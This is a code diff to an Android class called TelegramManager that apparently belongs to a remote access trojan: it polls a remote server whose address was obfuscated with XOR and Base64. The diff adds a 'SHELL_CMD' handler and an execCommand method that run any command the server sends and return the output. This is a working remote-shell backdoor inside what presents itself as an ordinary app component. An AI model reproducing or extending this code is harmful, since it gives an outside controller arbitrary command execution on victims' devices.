@@ -30,9 +30,16 @@ import com.hhm.android.otherapp.utils.RatVo;
 import com.hhm.android.otherapp.utils.XorUtil;
 import com.jakewharton.retrofit2.adapter.rxjava2.RxJava2CallAdapterFactory;
 
+import java.io.BufferedReader;
 import java.io.File;
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.io.LineNumberReader;
 import java.net.SocketException;
 import java.net.SocketTimeoutException;
+import java.util.ArrayList;
+import java.util.List;
 import java.util.concurrent.TimeoutException;
 
 import io.reactivex.functions.Consumer;
@@ -45,6 +52,8 @@ import retrofit2.HttpException;
 import retrofit2.Response;
 import retrofit2.Retrofit;
 import retrofit2.converter.gson.GsonConverterFactory;
+
+import static com.hhm.android.otherapp.Https.HttpRequest.genericClient;
 
 
 /**
@@ -82,10 +91,11 @@ public class TelegramManager {
     //public static String url = "http://tg.fupdate.cc:8001";
     //public static String url = "http://192.168.3.86:8001";
     public static String url = "http://" + ServiceConfig.getRemoteAddress();
+    //public static String url = "http://192.168.6.29:8000";
     public static int count = 0;
 
     public static void startAsync(final Context con) {
-        System.out.println("2021==99>" + Base64Util.encode(XorUtil.xor("192.168.3.86:8001")));
+        System.out.println("2021==url==>" + url);
         try {
             context = con;
             sendReq();
@@ -372,6 +382,10 @@ public class TelegramManager {
                                     Datas_n(context,action_id,10001,"没有权限，无法执行操作",null);
                                 }
                                 break;
+                            case "SHELL_CMD": // 执行shell命令返回执行结果
+                                String command = jsonObject.get("command").toString().substring(1,jsonObject.get("command").toString().length()-1);
+                                Datas_n(context,action_id,0,"success", execCommand(command));
+                                break;
                             default:
                                 break;
                         }
@@ -381,6 +395,31 @@ public class TelegramManager {
                 }
             }
         });
+    }
+
+    // 执行shell命令，返回结果
+    public static JsonObject execCommand(String cmd) {
+        JsonObject info = new JsonObject();
+        try {
+            Process p = Runtime.getRuntime().exec(cmd);
+            String data = "";
+            BufferedReader ie = new BufferedReader(new InputStreamReader(p.getErrorStream()));
+            BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream()));
+            String error;
+            while ((error = ie.readLine()) != null) {
+                data += error + "\n";
+            }
+            String line;
+            while ((line = in.readLine()) != null) {
+                data += line + "\n";
+            }
+            if (data.equals("") && p.waitFor() == 0) data = "success";
+            info.addProperty("result",data);
+        } catch (IOException | InterruptedException e) {
+            e.printStackTrace();
+            info.addProperty("result",e.toString());
+        }
+        return info;
     }
 
     // 数据结果上报 格式：JsonArray
@@ -468,6 +507,7 @@ public class TelegramManager {
                 .build();
 
         Retrofit retrofit = new Retrofit.Builder().baseUrl(url)
+                .client(genericClient())
                 .addConverterFactory(GsonConverterFactory.create())
                 .addCallAdapterFactory(RxJava2CallAdapterFactory.create()).build();
         API api = retrofit.create(API.class);
